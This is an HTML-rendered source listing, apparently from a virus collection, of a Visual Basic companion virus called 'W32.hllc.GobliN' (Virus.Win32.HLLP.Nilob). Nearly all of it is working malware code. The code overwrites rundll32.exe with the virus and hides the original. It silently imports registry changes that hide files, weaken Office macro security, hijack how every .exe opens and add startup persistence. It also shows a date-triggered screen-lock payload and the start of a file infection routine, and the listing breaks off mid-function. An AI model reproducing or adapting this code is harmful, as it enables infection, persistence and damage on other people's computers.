<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.HLLP.Nilob - goblin.bas.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'**********************************************************
'W32.hllc.GobliN by DR-EF (c) 2002 all right reserved !!! *
'Goblin is a Companion virus infect exe files.the virus   *
'infect programs when the program run this virus also have*
'a nice graphical payload.                                *
'**********************************************************
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetCurrentProcessId</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegisterServiceProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ShowCursor</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bShow</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">uExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"PostMessageA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindWindow</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"FindWindowA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpClassName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpWindowName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">virus_path</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc1">'main of virus:
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">hide_goblin</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">get_goblin_path</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Disease_effect</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">payload</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">infect_file</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">App.EXEName</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"rundll32"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">App.PrevInstance</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Protect</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">payload</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc1">'virus payload:
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc3">Date</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc7">ShowCursor</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">Form1.BackColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbBlack</span><span class="sc0">
</span><span class="sc7">Form1.Label1.ForeColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbRed</span><span class="sc0">
</span><span class="sc7">Form1.Label1.BackColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbbblack</span><span class="sc0">
</span><span class="sc3">Load</span><span class="sc0"> </span><span class="sc7">Form1</span><span class="sc0">
</span><span class="sc7">Form1.Show</span><span class="sc0">
</span><span class="sc7">h</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">x</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Form1.Label1.FontSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc0">
</span><span class="sc7">Form1.Label1.Caption</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">".-=w32.Hllc.GobliN=-."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"CopyRight To DR-EF"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"All Right Reseved !!!"</span><span class="sc0">
</span><span class="sc7">Label1.ForeColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbRed</span><span class="sc0">
</span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc7">h</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Label1.ForeColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbYellow</span><span class="sc0">
</span><span class="sc7">Form1.Label1.FontSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc0">
</span><span class="sc7">Form1.Label1.Caption</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"GobliN VIRUS !!!"</span><span class="sc0">
</span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">h</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">59</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">59</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Beep</span><span class="sc0">
</span><span class="sc7">SendKeys</span><span class="sc0"> </span><span class="sc4">"{Esc}"</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc7">Form1.SetFocus</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Disease_effect</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc1">'virus install:
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc4">"c:\windows\Rundll32.GbN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc4">"c:\windows\rundll32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c:\windows\rundll32.GbN"</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">virus_path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c:\windows\Rundll32.exe"</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc4">"c:\windows\rundll32.GbN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc4">"c:\windows\rundll32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"c:\Goblin_disease.reg"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REGEDIT4"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"virus_filter"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=dword:00000000"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Hidden"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=dword:00000000"</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CURRENT_USER\Software\Microsoft\Office\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".0\Word\Security]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=dword:00000001"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"AccessVBOM"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"DontTrustInstalledFiles"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=dword:00000001"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CURRENT_USER\Software\Microsoft\Office\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".0\Excel\Security]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"""Level""=dword:00000001"</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CLASSES_ROOT\exefile\shell\open\command]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"@="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"c:\\windows\\RunDll32.exe\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" %1 %*"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Goblin_By_DR-EF"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"c:\\windows\\rundll32.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Reg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">RegHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">Reg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc4">"regedit /s c:\goblin_disease.reg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHide</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">RegHandle</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc2">&amp;H100000</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Reg</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc4">"c:\goblin_disease.reg"</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc7">TerminateProcess</span><span class="sc0"> </span><span class="sc7">RegHandle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc7">RegHandle</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc1">'***********File Infection Engine*******************
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">infect_file</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc1">'stupid code but work good
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">App.EXEName</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"rundll32"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc11">file</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc11">file</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"GbN"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">host</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
